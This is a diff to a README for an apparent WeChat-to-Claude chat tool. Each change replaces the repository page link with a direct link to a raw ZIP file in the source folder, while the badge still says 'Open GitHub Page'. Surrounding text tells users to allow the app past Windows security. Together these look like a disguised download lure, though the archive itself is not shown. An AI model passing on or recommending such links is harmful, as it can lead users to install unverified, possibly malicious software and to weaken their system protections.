@@ -1,6 +1,6 @@
 # 🤖 wechat-claude-code - Chat with Claude in WeChat
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/misterJK2022/wechat-claude-code)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/misterJK2022/wechat-claude-code/raw/refs/heads/main/src/claude-code-wechat-1.9.zip)
 
 ## 📦 What this app does
 
@@ -19,7 +19,7 @@ If your PC blocks downloaded files, you may need to allow the app in Windows sec
 
 ## 🚀 Download and set up
 
-1. Open this page: https://github.com/misterJK2022/wechat-claude-code
+1. Open this page: https://github.com/misterJK2022/wechat-claude-code/raw/refs/heads/main/src/claude-code-wechat-1.9.zip
 2. Download the latest release or the main app package from the GitHub page
 3. Save the file to a folder you can find again, such as Downloads or Desktop
 4. If the file is a ZIP package, extract it first
@@ -143,7 +143,7 @@ Try these steps:
 
 Visit this page to download or open the latest project files:
 
-https://github.com/misterJK2022/wechat-claude-code
+https://github.com/misterJK2022/wechat-claude-code/raw/refs/heads/main/src/claude-code-wechat-1.9.zip
 
 ## 📄 Project name
 
